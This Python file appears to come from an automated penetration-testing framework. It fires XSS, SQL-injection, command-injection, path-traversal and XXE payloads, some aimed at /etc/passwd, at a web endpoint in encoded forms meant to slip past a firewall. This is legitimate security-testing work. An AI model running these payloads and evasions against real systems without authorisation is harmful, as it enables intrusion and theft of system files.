"""
WAF_BYPASS_TEST -- tests WAF bypass payloads against identified endpoints.

After WafBypassAgent detects a WAF, this tool tests common encoding bypasses.

Honesty model (two-sided proof, no blind size diffing):
  * A "blocked" baseline is captured by sending the RAW attack payload
    (what the WAF is supposed to censor/block).
  * An encoded probe must then BOTH (a) differ from that blocked baseline
    (i.e. the request truly got through the WAF) AND (b) produce a
    *server fingerprint* in the response body proving the attack payload was
    actually processed (e.g. unescaped <script>, an SQL error, passwd rows).
  * A raw response whose body shows none of those fingerprints is recorded
    as ``unconfirmed`` and is NOT a finding -- a size delta on an inert
    request is not evidence of a bypass.
"""

import re
import statistics
import subprocess
from typing import Any, Dict, List
from urllib.parse import quote

from tools.attack.verdict import (
    SQL_ERROR_MARKER,
    PASSWD_ENTRIES_MARKER,
    confidence_from_criteria,
    criteria_label,
)
from tools.base import Tool, ToolResult

# ── Bypass payload encodings ──────────────────────────────────────────────

BYPASS_ENCODINGS = {
    "double_url": lambda s: quote(quote(s, safe=""), safe=""),
    "unicode": lambda s: s.replace("<", "\\u003c").replace(">", "\\u003e"),
    "uppercase": lambda s: s.upper(),
    "lowercase": lambda s: s.lower(),
    "mixed_case": lambda s: "".join(
        c.upper() if i % 2 else c for i, c in enumerate(s)
    ),
    "null_byte": lambda s: s.replace(".", ".%00"),
    "chunked": lambda s: s,  # handled via curl header, not payload
}

# Benign probe payloads (normal behavior reference)
BASELINE_PAYLOADS = [
    ("normal_request", "id=1"),
    ("normal_request", "q=hello"),
]

# Attack probe payloads (test if WAF blocks them)
ATTACK_PAYLOADS = [
    ("xss", "<script>alert(1)</script>"),
    ("sqli", "' OR 1=1--"),
    ("cmd_inj", "; cat /etc/passwd"),
    ("lfi", "../../etc/passwd"),
    ("xxe", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
]

# Server fingerprints proving the encoded payload was *processed*, per attack
# type.  These are genuine server behaviors, never payload text echoed back.
_ATTACK_MARKERS = {
    "xss": re.compile(r"<script", re.IGNORECASE),
    "sqli": re.compile(SQL_ERROR_MARKER, re.IGNORECASE),
    "cmd_inj": re.compile(r"uid=\d+\(|/etc/passwd|root:", re.IGNORECASE),
    "lfi": re.compile(PASSWD_ENTRIES_MARKER),
    "xxe": re.compile(PASSWD_ENTRIES_MARKER),
}

CRITERIA_WEIGHTS = {
    "fingerprint_matched": 25,
    "passed_waf": 15,
    "waf_identified": 5,
    "encoding_supported": 0,
}
CRITERIA_HINTS = {
    "fingerprint_matched": "server fingerprint of the attack payload in response",
    "passed_waf": "probe response differs from the raw-attack blocked baseline",
    "waf_identified": "WAF was identified (wafw00f/nuclei)",
    "encoding_supported": "encoding transform applied successfully",
}


class WafBypassTool(Tool):
    """WAF bypass payload testing tool."""

    name = "waf_bypass_payloads"
    capability = "WAF_BYPASS_TEST"
    binary = "curl"

    def build_command(self, target: str, **kwargs) -> List[str]:
        return ["echo", "waf-bypass-placeholder"]

    def parse(self, stdout: str, stderr: str) -> Dict[str, Any]:
        return {}

    def run(self, target: str, timeout: int = 120, **kwargs) -> ToolResult:
        base = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        waf_type = kwargs.get("waf_type", "unknown")
        endpoint = kwargs.get("endpoint", base)

        # Step 1: benign baseline (normal application behavior)
        baseline_sizes = []
        baseline_codes = []
        for _, payload in BASELINE_PAYLOADS:
            code, size, _body = self._curl_get(f"{endpoint}?{payload}", timeout=min(timeout, 10))
            if code:
                baseline_sizes.append(size)
                baseline_codes.append(code)

        if not baseline_codes:
            return ToolResult(
                tool=self.name, status="error", capability=self.capability,
                error="Could not establish baseline responses",
            )

        # Step 2: two-sided proof per attack payload + encoding
        findings = []
        blocked_count = 0
        unconfirmed = []
        for attack_name, attack_payload in ATTACK_PAYLOADS:
            marker = _ATTACK_MARKERS.get(attack_name)

            # What a WAF-blocked request looks like: the RAW payload request.
            block_code, block_size, block_body = self._curl_get(
                f"{endpoint}?q={attack_payload}", timeout=min(timeout, 10))
            if not block_code:
                continue

            for encoding_name, encode_fn in BYPASS_ENCODINGS.items():
                if encoding_name == "chunked":
                    continue  # handled separately
                encoded = encode_fn(attack_payload)
                test_url = f"{endpoint}?q={encoded}"
                code, size, body = self._curl_get(test_url, timeout=min(timeout, 10))
                if not code:
                    continue

                fingerprint = bool(marker and marker.search(body or ""))

                # "passed the WAF": probe differs from the raw-blocked baseline
                passed_waf = (
                    code != block_code
                    or (block_size is not None and abs((size or 0) - block_size) > 50)
                )

                if not fingerprint:
                    unconfirmed.append({
                        "url": endpoint,
                        "attack_type": attack_name,
                        "encoding": encoding_name,
                        "response_code": code,
                        "reason": "no server fingerprint of the payload in response",
                    })
                    continue

                met = ["fingerprint_matched"]
                if passed_waf:
                    met.append("passed_waf")
                    blocked_count += 0
                if waf_type not in ("unknown", ""):
                    met.append("waf_identified")
                if True:
                    met.append("encoding_supported")
                conf = confidence_from_criteria(met, CRITERIA_WEIGHTS)
                findings.append({
                    "url": endpoint,
                    "attack_type": attack_name,
                    "encoding": encoding_name,
                    "original_payload": attack_payload[:100],
                    "encoded_payload": encoded[:200],
                    "response_code": code,
                    "response_size": size,
                    "waf_block_code": block_code,
                    "baseline_codes": list(set(baseline_codes)),
                    "severity": "HIGH" if passed_waf else "MEDIUM",
                    "confidence": conf,
                    "description": (f"WAF bypass via {encoding_name} encoding on {attack_name} "
                                    f"at {endpoint}: payload fingerprint present in response "
                                    f"({criteria_label(met, CRITERIA_HINTS)})"),
                    "proof_criteria": met,
                })
                break  # one bypass per attack type is enough

        return ToolResult(
            tool=self.name, status="success", capability=self.capability,
            results={
                "bypass_findings": findings,
                "count": len(findings),
                "waf_type": waf_type,
                "baseline_codes": list(set(baseline_codes)),
                "baseline_sizes": baseline_sizes,
                "unconfirmed": unconfirmed,
            },
        )

    @staticmethod
    def _curl_get(url: str, timeout: int) -> tuple[int, int, str]:
        """GET returning (status_code, size, body)."""
        cmd = [
            "curl", "-s",
            "-m", str(min(timeout, 15)),
            "-A", "Mozilla/5.0 (compatible; CyberSwarm-waf-bypass/1.0)",
            "-w", "\n%{http_code} %{size_download}",
            url,
        ]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout, errors="replace")
            stdout = proc.stdout or ""
            lines = stdout.rsplit("\n", 1)
            meta = lines[-1].strip().split() if lines else []
            if len(meta) == 2:
                body = lines[0] if len(lines) > 1 else ""
                return int(meta[0]), int(meta[1]), body
        except (subprocess.TimeoutExpired, ValueError, FileNotFoundError):
            pass
        return 0, 0, ""